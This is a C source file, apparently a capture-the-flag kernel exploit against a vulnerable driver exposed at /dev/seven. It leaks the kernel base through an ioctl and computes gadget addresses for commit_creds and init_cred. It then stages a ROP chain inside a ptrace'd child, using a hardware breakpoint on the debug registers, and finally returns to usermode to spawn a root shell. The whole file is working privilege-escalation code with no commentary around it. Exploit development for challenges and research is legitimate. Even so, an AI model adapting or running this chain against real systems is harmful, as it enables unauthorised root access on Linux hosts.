#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <syscall.h>
#include <unistd.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)


#define o(x) (kbase + x)

size_t pop_rdi = 0x2c9d;
size_t commit_creds = 0xbb5b0;
size_t init_cred = 0x1a4cbf8;
size_t swapgs_restore_regs_and_return_to_usermode = 0x1000f01;
size_t prepare_kernel_cred = 0xf8520;

void* map;
pid_t hbp_pid;
uint64_t kbase;

unsigned long user_cs, user_ss, user_eflags, user_sp, user_ip;

void get_shell() {
    int uid;
    if (!(uid = getuid())) {
        logi("root get!!");
        execl("/bin/sh", "sh", NULL);
    } else {
        die("gain root failed, uid: %d", uid);
    }
}

void saveStatus(void) {
        __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_eflags;"
            );

    user_ip = (uint64_t)&get_shell;
    user_sp = 0xf000 +
              (uint64_t)mmap(0, 0x10000, 6, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

void teardown()
{
    kill(hbp_pid,9);
}

void update_addr(){
    pop_rdi = o(pop_rdi);
    commit_creds = o(commit_creds);
    init_cred = o(init_cred);
    swapgs_restore_regs_and_return_to_usermode = o(swapgs_restore_regs_and_return_to_usermode);
    prepare_kernel_cred = o(prepare_kernel_cred);
}

#define DR_OFFSET(num) ((void *)(&((struct user *)0)->u_debugreg[num]))
void create_hbp(pid_t pid, void *addr) {

    // Set DR0: HBP address
    if (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(0), addr) != 0) {
        die("create hbp ptrace dr0: %m");
    }

    /* Set DR7: bit 0 enables DR0 breakpoint. Bit 8 ensures the processor stops
     * on the instruction which causes the exception. bits 16,17 means we stop
     * on data read or write. */
    unsigned long dr_7 = (1 << 0) | (1 << 8) | (1 << 16) | (1 << 17);
    if (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(7), (void *)dr_7) != 0) {
        die("create hbp ptrace dr7: %m");
    }
}

void hbp_raw_fire()
{
    if(ptrace(PTRACE_CONT,hbp_pid,NULL,NULL) == -1)
        {
            printf("Failed to PTRACE_CONT: %m\n");
            teardown();
            exit(1);
        }
}
void init(unsigned cpu)
{
    cpu_set_t mask;
    map = mmap((void*) 0x0a000000,0x1000000,PROT_READ | PROT_WRITE,MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED,0,0);
    switch(hbp_pid = fork())
    {
        case 0: //child
            //pin cpu

            CPU_ZERO(&mask);
            CPU_SET(cpu,&mask);
            sched_setaffinity(0,sizeof(mask),&mask);
            ptrace(PTRACE_TRACEME,0,NULL,NULL);
            raise(SIGSTOP);

            __asm__(
                "mov r15,   0xbeefdead;"
                "mov r14,   pop_rdi;"
                "mov r13,   init_cred;" // start at there
                "mov r12,   commit_creds;"
                "mov rbp,   swapgs_restore_regs_and_return_to_usermode;"
                "mov rbx,   0x77777777;"
                "mov r11,   0x77777777;"
                "mov r10,   user_ip;"
                "mov r9,    user_cs;"
                "mov r8,    user_eflags;"
                "mov rax,   user_sp;"
                "mov rcx,   user_ss;"
                "mov rdx,   0xcccccccc;"
                "mov rsi,   0xa000000;"
                "mov rdi,   [rsi];"
            );
            exit(1);
        case -1:
            printf("fork: %m\n");
            exit(1);
        default: //parent. Just exit switch
            break;
    }
    int status;
    //Watch for stop:
    puts("Waiting for child");
    while(waitpid(hbp_pid,&status,__WALL) != hbp_pid || !WIFSTOPPED(status))
    {
        sched_yield();
    }
    puts("Setting breakpoint");
    create_hbp(hbp_pid, map);
}

int main()
{
    saveStatus();
    int fd = open("/dev/seven", O_RDWR);
    if(fd < 0) perror("Error open");
    logi("open success!");
    unsigned long addr =  ioctl(fd,0x5555,0xfffffe0000000000+4);
    kbase = addr-0x1008e00;
    logi("kbase: 0x%lx", kbase);
    update_addr();

    init(1);
    hbp_raw_fire();
    waitpid(hbp_pid,NULL,__WALL);
    getchar();
    hbp_raw_fire();
    waitpid(hbp_pid,NULL,__WALL);
    getchar();
    ioctl(fd,0x6666,0xfffffe0000010f60);
}
